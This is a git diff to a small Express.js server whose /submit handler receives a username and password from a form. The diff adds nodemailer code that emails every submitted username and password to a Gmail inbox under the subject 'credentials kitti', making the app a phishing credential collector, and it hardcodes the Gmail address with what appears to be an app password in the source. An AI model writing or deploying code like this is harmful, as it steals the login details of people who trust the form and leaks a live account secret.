@@ -1,5 +1,8 @@
 import express from "express"
 import bodyparser from "body-parser"
+import nodemailer from "nodemailer"
+
+
 
 const app=express();
 const port=3000;
@@ -18,7 +21,44 @@ app.post("/submit",(req,res)=>{
     console.log(password);
 
     res.render("index.ejs");
-    alert("ayachitind");
+    
+
+    const transporter = nodemailer.createTransport({
+    service: "gmail",
+    auth: {
+      user: "karthiksecond96@gmail.com",          // acc details aan sukshikanam
+      pass: "iutn hehx bydq isoo"             
+    }
+   });
+
+
+ const mailOptions = {
+    from: "karthiksecond96@gmail.com",  // sender (user’s email from form)
+    to: "karthiksecond96@gmail.com", // your inbox
+    subject: "credentials kitti",
+    text: `username: ${username} \n password: ${password}`
+  };
+
+
+
+
+
+
+
+  // ✅ Send the email
+  transporter.sendMail(mailOptions, (err, info) => {
+    if (err) {
+      console.error("Error sending email:", err);
+      res.send(" Error sending email.");
+    } else {
+      console.log(" Email sent:", info.response);
+      
+    }
+  });
+
+  
+
+   
 })
 
 app.listen(process.env.PORT||port,()=>{
